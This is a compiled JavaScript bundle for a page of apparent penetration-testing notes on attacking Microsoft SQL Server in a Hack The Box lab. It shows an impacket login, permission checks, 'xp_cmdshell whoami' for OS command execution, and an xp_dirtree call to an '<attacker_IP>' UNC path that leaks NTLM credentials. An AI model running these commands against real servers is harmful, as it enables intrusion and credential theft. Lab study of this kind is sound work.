"use strict";(self.webpackChunkhacking=self.webpackChunkhacking||[]).push([[7980],{60:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>c,default:()=>p,frontMatter:()=>l,metadata:()=>r,toc:()=>i});var t=s(5893),a=s(1151);const l={slug:"/tooling/ms-sql",pagination_next:null,pagination_prev:null},c=void 0,r={id:"Hacking/Tooling/ms-sql",title:"ms-sql",description:"Connect with impacket-mssqlclient.py:",source:"@site/docs/Hacking/Tooling/ms-sql.md",sourceDirName:"Hacking/Tooling",slug:"/tooling/ms-sql",permalink:"/docs/tooling/ms-sql",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{slug:"/tooling/ms-sql",pagination_next:null,pagination_prev:null},sidebar:"tutorialSidebar"},o={},i=[];function d(e){const n={code:"code",p:"p",pre:"pre",...(0,a.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.p,{children:"Connect with impacket-mssqlclient.py:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"mssqlclient.py manager.htb/operator:operator@dc01.manager.htb -windows-auth\n"})}),"\n",(0,t.jsx)(n.p,{children:"Show databases"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sql",children:"SELECT name, database_id, create_date FROM sys.databases; \n"})}),"\n",(0,t.jsx)(n.p,{children:"Show tables"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sql",children:"SELECT name FROM sys.tables;\n"})}),"\n",(0,t.jsx)(n.p,{children:"Check if we have permission to run xp_*"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sql",children:"EXEC sp_helprotect 'xp_cmdshell'\nEXEC sp_helprotect 'xp_dirtree'\n"})}),"\n",(0,t.jsx)(n.p,{children:"Execute code"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sql",children:"EXEC xp_cmdshell whoami\n"})}),"\n",(0,t.jsx)(n.p,{children:"List files"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sql",children:"EXEC xp_dirtree '\\\\<attacker_IP>\\any\\thing'\nEXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1;\n"})})]})}function p(e={}){const{wrapper:n}={...(0,a.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},1151:(e,n,s)=>{s.d(n,{Z:()=>r,a:()=>c});var t=s(7294);const a={},l=t.createContext(a);function c(e){const n=t.useContext(l);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:c(e.components),t.createElement(l.Provider,{value:n},e.children)}}}]);